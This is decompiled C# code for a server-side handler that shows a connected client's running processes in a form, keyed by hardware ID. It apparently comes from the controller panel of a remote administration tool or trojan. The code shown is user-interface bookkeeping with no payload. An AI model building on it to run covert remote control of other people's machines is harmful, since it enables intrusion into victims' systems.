using System;
using System.Collections;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x0200005B RID: 91
	internal class HandlerProcess
	{
		// Token: 0x060001EC RID: 492 RVA: 0x0001EFCC File Offset: 0x0001D1CC
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "DeadProcess"))
				{
					if (!(a == "NewProcess"))
					{
						if (!(a == "Error"))
						{
							return;
						}
						if (client.Tag == null)
						{
							client.Disconnect();
							return;
						}
						FormProcess form = (FormProcess)client.Tag;
						form.Invoke(new MethodInvoker(delegate()
						{
							form.materialLabel1.Text = "Error: " + (string)objects[2];
						}));
						return;
					}
					else
					{
						if (client.Tag == null)
						{
							client.Disconnect();
							return;
						}
						FormProcess form = (FormProcess)client.Tag;
						form.Invoke(new MethodInvoker(delegate()
						{
							form.materialLabel1.Text = "New Process pid: " + ((int)objects[4]).ToString();
							DataGridViewRow dataGridViewRow = new DataGridViewRow();
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[2]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (int)objects[4]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[3]
							});
							form.dataGridView2.Rows.Add(dataGridViewRow);
							form.Text = string.Format("Process [{0}] Process [{1}]", client.Hwid, form.dataGridView2.Rows.Count);
						}));
						return;
					}
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormProcess form = (FormProcess)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.materialLabel1.Text = "Dead Process pid: " + ((int)objects[2]).ToString();
						foreach (object obj in ((IEnumerable)form.dataGridView2.Rows))
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							if ((int)dataGridViewRow.Cells[1].Value == (int)objects[2])
							{
								form.dataGridView2.Rows.Remove(dataGridViewRow);
								break;
							}
						}
						form.Text = string.Format("Process [{0}] Process [{1}]", client.Hwid, form.dataGridView2.Rows.Count);
					}));
					return;
				}
			}
			else
			{
				FormProcess form = (FormProcess)Application.OpenForms["Process:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Process [" + (string)objects[2] + "] Process [0]";
					form.materialLabel1.Text = "Succues Connect";
					form.client = client;
					form.dataGridView2.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
